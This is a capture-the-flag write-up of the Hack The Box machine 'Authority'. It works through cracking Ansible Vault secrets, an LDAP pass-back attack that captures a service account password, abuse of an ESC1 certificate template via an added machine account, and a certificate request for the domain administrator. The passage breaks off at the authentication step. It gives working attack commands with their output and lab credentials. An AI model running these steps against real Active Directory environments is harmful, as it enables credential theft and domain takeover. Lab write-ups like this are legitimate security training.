---
layout: secret_post
title: Authority - HackTheBox (Medium)
categories:
- Password protected
- Active Directory
- Hack The Box
tags:
- ansible
- crackmapexec
- password cracking
- passback attack
- ldap
- adcs
- esc1
- pkinit
- ms-dsmachineaccountquota
- pass-the-cert
- kdc_err_padata_type_nosupp
- dcsync
date: 2023-07-17 16:00 +0100
description: Authority from Hack The Box was a medium rated Windows box involving Ansible vaults, a ldap passback attack and ADCS exploitation with a nice twist having to add a machine account to exploit ESC1 via the domain computers group then passing the certificate via LDAP.
image: /assets/img/Authority/authority.jfif
key: "6961f422924da90a6928197429eea4ed"
---


## Summary

Authority from HackTheBox was a medium rated Windows box that showcases some Ansible exploitation, a neat pass-back attack and a nice twist on `ESC1` by exploiting via domain computers rather than domain users, involving an additional set to add a computer account to the domain allowed by the `ms-DS-MachineAccountQuota` to enroll a ceritifcate with a domain administrator SAN. However, the Kerberos authentication certificate doesn't allow for `PKINIT` to obtain a `TGT` producing the `KDC_ERR_PADATA_TYPE_NOSUPP` error. Instead, we use `Pass-The-Cert` by authenticating via LDAP to grant ourselves `DCSync` privileges.


## Initial access
### Port scanning

Running an nmap scan with default scripts `-sC` and versioning `-sV` shows us this box represents a domain controller, `authority.authority.htb`. Interestingly we see unusual web services running on the DC via port `80` and `8443`, which we should definitely check out.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sCV -p- 10.129.235.244 -T4 --min-rate 500 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 09:59 BST
Nmap scan report for 10.129.237.176
Host is up (0.11s latency).
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-16 13:02:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-16T13:03:07+00:00; +4h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:03:08+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T13:03:09+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-16T13:03:08+00:00; +4h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn\'t have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 13:02:13 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 16 Jul 2023 13:02:13 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 16 Jul 2023 13:02:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-13T23:18:05
|_Not valid after:  2025-07-15T10:56:29
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
61148/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=7/16%Time=64B3B214%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2016\x20Ju
SF:l\x202023\x2013:02:13\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Su
SF:n,\x2016\x20Jul\x202023\x2013:02:13\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\
SF:x2016\x20Jul\x202023\x2013:02:13\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sun,\x2016\x20Jul\x202023\x2013:02
SF::20\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m00s
| smb2-time: 
|   date: 2023-07-16T13:02:57
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.84 seconds
```

From the scan we can update our `/etc/hosts` entry with the corresponding DNS names to enable dns resolution which will make our life easier. 
```shell
10.129.235.244  authority.htb authority.authority.htb
```
{: file="/etc/hosts" }

Working our way from the top ports down, looking at the website on port `80` we see it is a standard `IIS` page. There is no `/certsrv` so this is not a CA HTTP endpoint, which is always good to check!

![image-23.png](/assets/img/Authority/image-23.png)

### SMB enumeration

We also discover we cannot anonymously bind to RPC via `135`. Lets proceed to check `445` with with `crackmapexec` to see if we can anonymously enumerate shares and our permissions to read / write to any of them.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb authority.htb -u kali -p '' --shares
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\kali: 
SMB         authority.htb   445    AUTHORITY        [*] Enumerated shares
SMB         authority.htb   445    AUTHORITY        Share           Permissions     Remark
SMB         authority.htb   445    AUTHORITY        -----           -----------     ------
SMB         authority.htb   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         authority.htb   445    AUTHORITY        C$                              Default share
SMB         authority.htb   445    AUTHORITY        Department Shares                 
SMB         authority.htb   445    AUTHORITY        Development     READ            
SMB         authority.htb   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         authority.htb   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         authority.htb   445    AUTHORITY        SYSVOL                          Logon server share
```
![image-7.png](/assets/img/Authority/image-7.png)

We see there are two non-standard ones - `Department Shares` and `Development`, but we only have permissions to anonymously read the latter. Lets see what goodies we can find:

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient "//authority.htb/Development"                
```

![image.png](/assets/img/Authority/image.png)

We see that this company is trialing some automation using `Ansible`, which supports things like automatic configuration management and application deployment. As always with configuration, there are normally some secrets left behind for us to steal. However, there are so many files within each folder it is is not efficient trawling through everything in `smbclient` or even attempting to download everything recursively.

Instead, we are much better mounting the share to dig through it locally! We can do this like so:

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo mkdir /mnt/Development

┌──(kali㉿kali)-[~/Desktop/]
└─$ sudo mount -t cifs -o user=kali,password='' //authority.htb/Development /mnt/Development 
```

![image-8.png](/assets/img/Authority/image-8.png)

Now we have it all locally at `/mnt/Development/Automation/Ansible`\!

![image-1.png](/assets/img/Authority/image-1.png)

Just based off the names, two interesting automation folders include `ADCS` and `PWM` . 
- `ADCS` tells us Active Directory Certificate Services are likely used as a `PKI` solution within this domain. 
- `PWM` looks like an open-source [web app](https://github.com/pwm-project/pwm/){:target="_blank"} providing a 'self-service application for LDAP directories'.

### Web app enumeration

We can view the other non-standard port on port `8443`, and confirms this is indeed the `PWM` application.  

![image-24.png](/assets/img/Authority/image-24.png)

A note pops up telling us the app is running in configuration mode, and that we can update the config using the editor! Something to keep in mind...

![image-9.png](/assets/img/Authority/image-9.png)

As we are presented with a login page, we can try a quick win and attempt to login with some defaults `admin:admin`! 

![image-2.png](/assets/img/Authority/image-2.png)

Trying this produces an error - clearly the web application is running under the `svc_ldap` account, however it seems the ldap configuration is broken so we wont be able to login. This app seems very interesting indeed... 

Clicking on configuration manager button under 'sign in' takes us to a new login page.

![image-10.png](/assets/img/Authority/image-10.png)

We see previous autehtnciations attempts include `svc_pwn` . So if we could find the password in the configuration, we will be able to login!

### Ansible enumeration

Lets have a dig around `/mnt/Development/Automation/Ansible/PWM` as this might give us some clues as how to get into the application.

![image-12.png](/assets/img/Authority/image-12.png)

We find a YAML file `./defaults/main.yml` which contains some interesting looking hashes\!

![image-3.png](/assets/img/Authority/image-3.png)

Ansible Vault is a feature of ansible that allows you to keep sensitive data such as passwords or keys in encrypted files, rather than as plaintext in playbooks or roles. It basically lets you encrypt any data blob with a password using `AES256` encryption to keep them secure. These vault files can then be distributed or placed in source control. This is all highlighted in the documentation [here](https://docs.ansible.com/ansible/2.8/user_guide/vault.html){:target="_blank"}.

It seems likely that `pwm_admin_login` is the username for the applcation, and `pwm_admin_password` is the password. Lets stick these encrypted passwords in `enc.yml` and `enc2.yml` respectively.

```shell
┌──(kali㉿kali)-[~/Desktop/htb/authority]
└─$ cat enc.yml 
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
   
┌──(kali㉿kali)-[~/Desktop/htb/authority]
└─$ cat enc2.yml
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
```

![image-38.png](/assets/img/Authority/image-38.png)

As outlined [here](https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible){:target="_blank"}, using `ansible2john` will convert them into a hash format than john understands. We can then attempt to crack these `AES256` blobs to obtain the encryption key with `rockyou.txt`.

```shell
┌──(kali㉿kali)-[~/Desktop] 
└─$ ansible2john enc.yml > vault.in

┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt vault.in        
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (enc.yml)     
1g 0:00:00:19 DONE (2023-07-16 10:57) 0.05099g/s 2029p/s 2029c/s 2029C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Luckily for us the admin did not use a strong password when encrypting the vault, and we could crack it to `!@#$%^&*`!

![image-30.png](/assets/img/Authority/image-30.png)

Now with the ansible vault password we can decrypt the encrypted vaults with `ansible-vault decrypt`:

```shell
┌──(kali㉿kali)-[~/Desktop/htb/authority]
└─$ cat enc.yml | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm

┌──(kali㉿kali)-[~/Desktop/htb/authority]
└─$ cat enc2.yml | ansible-vault decrypt 
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

![image-32.png](/assets/img/Authority/image-32.png)

This reveals the credentials for the `svc_pwm` user that we saw previous authentications attempts to the`pwm` config editor\!

```shell
svc_pwm:pWm_@dm!N_!23
```
{: file="Credentials" }

With this password, we can login to the configuration editor:

![image-31.png](/assets/img/Authority/image-31.png)

This reveals a configuration panel we can edit. 

![image-25.png](/assets/img/Authority/image-25.png)

### LDAP pass-back attack
We know from attempting to login to the home page, the authentication is attempted via `svc_ldap`. However this is broken, as it fails to bind to `ldaps://authority.authority.htb:636`. I've often seen configurations like this when we get into printers, and allows for the classic Pass\-Back attack as described [here](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack){:target="_blank"}. If we change the address of the LDAPS server to our own hosted LDAP server then force the application to bind to our attacking server, we should be able to intercept the plaintext password of `svc_ldap`\!

We change the LDAPS URL to `ldap://10.10.14.180:389` and start a netcat listener on this port.

![image-26.png](/assets/img/Authority/image-26.png)

When we click "Test LDAP Profile" we get a callback to our makeshift LDAP server listener on `389`, and the password for `svc_ldap` via cleartext\!

![image-27.png](/assets/img/Authority/image-27.png)

Awesome so we now have the credentials for a `svc_ldap`!

```shell
svc_ldap:lDaP_1n_th3_cle4r!
```
{: file="Credentials" }

### User
Lets check if these credentials valid using `crackmapexec` to enumerate all the users in the domain:

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --users
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
SMB         authority.htb   445    AUTHORITY        [*] Trying to dump local users with SAMRPC protocol
SMB         authority.htb   445    AUTHORITY        [+] Enumerated domain user(s)
SMB         authority.htb   445    AUTHORITY        authority.htb\Administrator                  Built-in account for administering the computer/domain
SMB         authority.htb   445    AUTHORITY        authority.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         authority.htb   445    AUTHORITY        authority.htb\krbtgt                         Key Distribution Center Service Account
SMB         authority.htb   445    AUTHORITY        authority.htb\svc_ldap
```

And the creds are valid, and reveals no other users in the domain!

![image-14.png](/assets/img/Authority/image-14.png)

As our user is the only non standard user, it seems likely we should have access to get `user.txt`. Maybe we can connect remotely - lets try via `WinRM` as `5985` is open.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -u svc_ldap -i authority.htb -p lDaP_1n_th3_cle4r!
```

![image-13.png](/assets/img/Authority/image-13.png)

Luckily this works as our user is in the `Remote Management Users` group which allows us to connect\!

![image-15.png](/assets/img/Authority/image-15.png)

## Privesc
### Figuring out how to escalate

If we remember  back to the `Development` share we saw some ADCS Ansible scripts, so we should really check if there is a CA present in the domain. We can check this with `crackmapexec`:

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ crackmapexec ldap authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M adcs
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       authority.htb   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
ADCS        authority.htb   389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: authority.authority.htb
ADCS                                                Found CN: AUTHORITY-CA
```

![image-17.png](/assets/img/Authority/image-17.png)

This tells us there is indeed a CA - `AUTHORITY-CA`. As highlighted in recent years by SpectreOps in their [Certified Pre-Owned research](https://posts.specterops.io/certified-pre-owned-d95910965cd2){:target="_blank"}, abusing `ADCS` is arguably the easiest and most common way to escalate privileges within AD, just due to how easy it is to misconfigure. If you haven't yet read their awesome `143` page [whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf){:target="_blank"}, please do - it will make your next internal much easier as from my experience, it is very rare to stumble across an on prem environment without a somewhat misconfigured CA...

There are two main tools we could use to enumerate all `ADCS` misconfigurations: 
1. We could drop [Certify](https://github.com/GhostPack/Certify){:target="_blank"} to disk, however dropping offensive tools to disk on a clients network is not great practice so I don't want to do it here. 
2. Instead my preferred method is to run [Certipy](https://github.com/ly4k/Certipy){:target="_blank"} remotely with our obtained credentials, so we don't have to worry about AV / EDR / someone else abusing our tools. 

ADCS makes use of certificate templates, which are certificate setting blueprints for certificates that can be issued. The problem arises that these templates are ridiculously easy to misconfigure, as we will soon see. We can use `certipy` to find all `ADCS` certificate templates, then filter for vulnerable ones (`-vulnerable`) and print the output to screen (`-stdout`):
```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.235.244 -vulnerable -stdout 
Certipy v4.3.0 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators                                                                                                         
      Access Rights                                                                                                                                                            
        ManageCertificates              : AUTHORITY.HTB\Administrators                                                                                                         
                                          AUTHORITY.HTB\Domain Admins                                                                                                          
                                          AUTHORITY.HTB\Enterprise Admins                                                                                                      
        ManageCa                        : AUTHORITY.HTB\Administrators                                                                                                         
                                          AUTHORITY.HTB\Domain Admins                                                                                                          
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

![image-29.png](/assets/img/Authority/image-29.png)

This tells us the `CorpVPN` template is vulnerable to `ESC1`!

### ESC1 via Domain Computers
`ESC1` is the most commonly seen certificate template vulnerability. It arises when a certificate template allows low-privileged users enrolment rights, permits client authentication and allows the enrollee to supply an arbitrary Subject Alternate Name (`SAN`). 

A `SAN` allows additional identities to be bound to a certificate beyond the subject of the certificate (e.g. supplying additional hostnames for `HTTPS` certIficates). However, when used for authentication, AD maps certificates to user accounts based on the `UPN` supplied in the `SAN`. So as a low-privilged user (e.g. `AUTHORITY.HTB\Domain Users`) if we supply a `UPN` of a domain admin in the `SAN` of our certificate, we can simply become a domain admin! 

![thisisfine.jpg](/assets/img/Authority/thisisfine.jpg)

Now this box plays a nice twist on the `ESC1` vulnerability as usually `ESC1` is exploitable where `Domain Users` can enroll in the misconfigured template, however this time the only low-privileged accounts that can enrol are `Domain Computers`. We only have `svc_ldap` credentials and haven't compromised any computers in the domain so we can't exploit this, right? 

Well fortunately for us, by default AD allows unprivileged domain users to create up to `10` machine accounts in a domain! The idea for this is to allow users to join new computers to the domain, but does your `PWM` web app service account really need the right to do this? Probably not, so really this should be set to `0` unless deemed absolutely necessary. We can check the `ms-DS-MachineAccountQuota` remotely:

```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ crackmapexec ldap authority.htb -u svc_ldap -p lDaP_1n_th3_cle4r! -M maq                          
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       authority.htb   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         authority.htb   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         authority.htb   389    AUTHORITY        MachineAccountQuota: 10
```

We see as expected it is `10` (default).

![image-16.png](/assets/img/Authority/image-16.png)

Alternatively if we didn't have credentials, we could drop [StandIn](https://github.com/FuzzySecurity/StandIn){:target="_blank"} to disk and enumerate the quota that way:

```shell
*Evil-WinRM* PS C:\windows\tasks> .\StandIn_v13_Net45.exe --object ms-Ds-MachineAccountQuota=*
[?] Using DC : authority.authority.htb
[?] Object   : DC=authority
    Path     : LDAP://DC=authority,DC=htb
[?] Iterating object properties
...
[+] ms-ds-machineaccountquota
    |_ 10
```

### Adding a new machine to the domain
So we can use our `svc_ldap` user to add a computer object to the domain, with a username and password we specify - did someone say free credentials? Further, by default machine accounts created through `MAQ` are added to the `Domain Computers` group, which is exactly what we need to enrol into the `CorpVPN` template to allow us to specify a `SAN`.  

We can use use impacket's [addcomputer.py](https://tools.thehacker.recipes/impacket/examples/addcomputer.py){:target="_blank"} to remotely add a computer `EvilComputer$` to the domain, then check it exists\!

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-addcomputer -computer-name 'EvilComputer$' -computer-pass 'SomePassword' -dc-host authority.htb -domain-netbios AUTHORITY 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'   
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Successfully added machine account EvilComputer$ with password SomePassword.[*] Successfully added machine account EvilComputer$ with password SomePassword.

┌──(kali㉿kali)-[~/Desktop]┌──(kali㉿kali)-[~/Desktop]
└─$ crackmapexec smb authority.htb -u 'EvilComputer$' -p 'SomePassword'                                                                 
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\EvilComputer$:SomePassword
```

![image-18.png](/assets/img/Authority/image-18.png)

We see it is added to the `Domain Computers` group - just what we want\!

```shell
*Evil-WinRM* PS C:\windows\tasks> net group "domain computers" /domain
```

![image-4.png](/assets/img/Authority/image-4.png)


### Enrolling into the vulnerable template & supplying a SAN
On the [Certipy github](https://github.com/ly4k/Certipy#esc1){:target="_blank"} it explains nicely how we can exploit `ESC1` . We request a new certificate based on the `CorpVPN` template from the `AUTHORITY-CA` certificate authority and supply a SAN of the domain admin `administrtor@authority.htb`. We also use the `-debug` parameter in case of any errors that are thrown: 

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ certipy req -username EvilComputer$ -password SomePassword -ca AUTHORITY-CA -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -dc-ip 10.129.235.244 -dns authority.htb -debug 
Certipy v4.3.0 - by Oliver Lyak (ly4k)
[+] Trying to resolve 'authority.authority.htb' at '10.129.235.244'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.235.244[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.235.244[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 2
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

![image-19.png](/assets/img/Authority/image-19.png)

With our new certificate we can try to authenticate via `PKINIT` to obtain a `TGT` for `Administrator`.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ certipy auth -pfx administrator_authority.pfx -dc-ip 10.129.235.244
